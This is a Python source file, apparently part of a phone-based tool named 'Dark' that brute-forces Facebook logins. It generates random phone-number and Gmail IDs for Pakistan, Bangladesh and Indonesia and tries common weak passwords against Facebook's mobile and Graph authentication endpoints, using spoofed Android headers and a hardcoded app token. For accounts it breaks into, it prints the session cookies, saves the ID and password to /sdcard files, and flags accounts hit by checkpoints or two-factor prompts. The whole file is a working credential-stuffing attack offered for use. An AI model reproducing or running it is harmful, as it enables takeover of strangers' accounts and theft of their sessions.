    print('\033[1;31m Code example: 0306,0315,0335,0345')
    code = input('\033[1;37m put code: ')
    try:
        limit = int(
            input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as Aking:
        clear()
        tl = str(len(user))
        print(' Total ids : \033[1;32m'+tl)
        print(f'\033[1;32m Cracking has been started')
        linex()
        print(f'\033[1;31mUSE FLIGHT MODE IN EVERY 5MIN')
        linex()
        for psx in user:
            ids = code+psx
            passlist = [psx, ids, 'Pakistan', 'khan1122',
                        'khan12345', 'khan123', 'khan123456', 'khankhan123']
            Aking.submit(rndm, ids, passlist)
    print('\033[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(oks)) +
          '/'+str(len(cps))+'/'+str(len(twf)))
    linex()
    input(' Press enter to back ')
    os.system('python Dark.py')


def bd():
    user = []
    clear()
    print('\033[1;31m Code example: 016,017,018,019,015,013')
    code = input('\033[1;37m put code: ')
    try:
        limit = int(
            input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Aking:
        clear()
        tl = str(len(user))
        print(' Total ids : \033[1;32m'+tl)
        print(' \033[1;32m Cracking has been started')
        print(f'\033[1;31m USE FLIGHT MODE IN EVERY 5MIN')
        linex()
        for psx in user:
            ids = code+psx
            passlist = [psx, ids, 'first7digit', 'last7digit', 'first6digit', 'last6digit', 'fullnumber', 'first8digit', 'last8digit', 'Bangladesh', 'bangladesh', 'i love you', 'iloveyou', 'free fire', 'freefire', 'pubg1234', '102030', '405060', '708090', '101010', '202020', '303030', '404040',
                        '505050', '606060', '707070', '808080', '909090', 'hacker1234', 'Sadia1234', 'Sumaiya1234', 'Mim1234', '121212', '232323', '343434', '565656', '787878', '898989', 'Bangladesh1234', 'bangladesh1234', 'freefire1234', 'Freefire1234', 'Gamer1234', 'gamer1234', 'Hacker1234', 'sadiya', 'sumaiya']
            Aking.submit(rndm, ids, passlist)
    print('\033[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(oks)) +
          '/'+str(len(cps))+'/'+str(len(twf)))
    linex()
    input(' Press enter to back ')
    os.system('python Dark.py')


def indo():

    user = []

    clear()
    print('\033[1;31m Code example: 021,031,035,071,0411,etc')
    code = input('\033[1;37m put code: ')
    try:
        limit = int(
            input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Aking:
        clear()
        tl = str(len(user))
        print(' Total account : \033[1;32m'+tl)
        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
        linex()
        print(f'\033[1;31m USE FLIGHT MODE IN EVERY 5MIN')
        linex()
        for psx in user:
            ids = code+psx

            passlist = [psx, psx[1:], "indonesia",
                        ids, 'free fire', 'freefire']

            Aking.submit(rndm, ids, passlist)
    print('\033[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(oks)) +
          '/'+str(len(cps))+'/'+str(len(twf)))
    linex()
    input(' Press enter to back ')
    os.system('python Dark.py')


def gmail():
    os.system('rm -rf .re.txt')
    clear()
    print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
    linex()
    first = input(' Put first name: ')
    linex()
    print('\033[1;37m example: khan, awais, ali \033[1;97m')
    linex()
    last = input(' Put last name: ')
    linex()
    print(' Example: @gmail.com , @yahoo.com etc...')
    linex()
    domain = input(' domain: ')
    linex()
    try:
        limit = int(input(' Put limit: '))
    except ValueError:
        limit = 5000
    linex()
    print(' Getting gmails...')
    lists = ['3', '4']
    for xd in range(limit):
        lchoice = random.choice(lists)
        if '3' in lchoice:
            mail = ''.join(random.choice(string.digits) for _ in range(3))
            open('.re.txt', 'a').write(first.lower() +
                                       last.lower()+mail+domain+'|'+first+' '+last+'\n')
        else:
            mail = ''.join(random.choice(string.digits) for _ in range(4))
            open('.re.txt', 'a').write(first.lower() +
                                       last.lower()+mail+domain+'|'+first+' '+last+'\n')
        fo = open('.re.txt', 'r').read().splitlines()
    with tred(max_workers=30) as Aking:
        total = str(len(fo))
        clear()
        print(' Total ids : \033[1;32m'+total)
        print("\033[1;32m Cracking has been Started")
        linex()
        print(f'\033[1;37mUSE FLIGHT MODE IN EVERY 5MIN')
        linex()
        for user in fo:
            ids, names = user.split('|')
            first_name = names.rsplit(' ')[0]
            try:
                last_name = names.rsplit(' ')[1]
            except IndexError:
                last_name = 'Khan'
            fs = first_name.lower()
            ls = last_name.lower()
            passlist = [fs+ls, fs+' '+ls, fs+'123', fs+'12345',
                        fs+'1122', fs, fs+'1234', fs+'786', fs+'12']
            Aking.submit(rndm, ids, passlist)
    print('\033[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(oks)) +
          '/'+str(len(cps))+'/'+str(len(twf)))
    linex()
    input(' Press enter to back ')
    os.system('python Dark.py')


def ffb(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(
        '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace(
                'Last', last).replace('first', ps).replace('last', ps2)
            ua = random.choice(ugen)
            head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            getlog = session.get(
                f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass = {"lsd": re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', str(
                getlog.text)).group(1), "uid": ids, "next": "https://free.facebook.com/login/save-device/", "flow": "login_no_pin", "pass": pas, }
            complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',
                                    data=idpass, allow_redirects=False, headers=head)
            Aking = session.cookies.get_dict().keys()
            if "c_user" in Aking:
                print("")
                print('\r\r\033[1;37m[Dark-OK💚] %s | %s' % (ids, pas))
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in session.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in Aking:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop += 1


def api(ids, names, passlist):
    try:
        global oks, loop, sim_id, device
        sys.stdout.write(
            '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()

        fn = names.split(' ')[0]

        try:
            ln = names.split(' ')[1]
        except:
            ln = fn

        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower(
            )).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'community_id': '',
                "sim_country": "id",
                'try_num': '1',
                'family_device_id': family,
                'sim_serials': sim_serials,
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'logged_out_id': str(uuid.uuid4()),
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'tier': 'regular',
                'reg_instance': str(uuid.uuid4()),
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'locale': fblc,
                'client_country_code': '',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)),
                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print("")
                print('\r\r\033[1;37m[Dark-OK💚] '+ids+' | '+pas+'\033[1;97m')
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in po.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print("")
                    print('\r\r \033[1;34m[Dark-2F] '+ids+' | '+pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
                else:
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
            else:
                continue
        loop += 1
    except Exception as e:
        pass


def api1(ids, names, passlist):
    try:
        global oks, loop, sim_id
        sys.stdout.write(
            '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower(
            )).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "sim_country": "id",
                "network_country": "id",
                "enroll_misauth": "false",
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                "cpl": "true",
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'fb_api_req_friendly_name': 'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-api.facebook.com/method/auth.login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()

            if 'session_key' in po:
                print("")
                print('\r\r\033[1;37m[Dark-OK💚] '+ids+' | '+pas+'\033[1;97m')
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in po.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print("")
                    print('\r\r \033[1;34m[Dark-2F] '+ids+' | '+pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error_msg']:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
                else:
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
            else:
                continue
        loop += 1
    except Exception as e:
        pass


def rndm(ids, passlist):
    global loop
    global oks
    sys.stdout.write(
        '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                "sim_country": "id",
                "network_country": "id",
                "relative_url": "method/auth.login",
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    print("")
                    print('\r\r\033[1;37m[Dark-OK💚] ' +
                          str(uid)+' | '+pas+'\033[1;97m')
                    print('[🌺]=COOKIES ⬇')
                    cookies = ""
                    for k,v in po.cookies.items():
                        cookies += str(k) + "=" + str(v) + ";"
                    print('\r\r\033[1;32m %s' % cookies)
                    os.system('espeak -a 300 " Dark, ok, id"')
                    open('/sdcard/Dark-OK.txt', 'a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in po['error']['message']:
                try:
                    uid = po['error']['error_data']['uid']
                except:
                    uid = ids
                if uid in oks:
                    pass
                else:
                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(str(uid)+'|'+pas+'\n')
                    cps.append(str(ids))
                    break
            else:
                continue
        loop += 1
    except Exception as e:
        pass


try:

    menu()
except requests.exceptions.ConnectionError:
    print('\n No internet connection ...')
    exit()
except Exception as e:
    print(e)
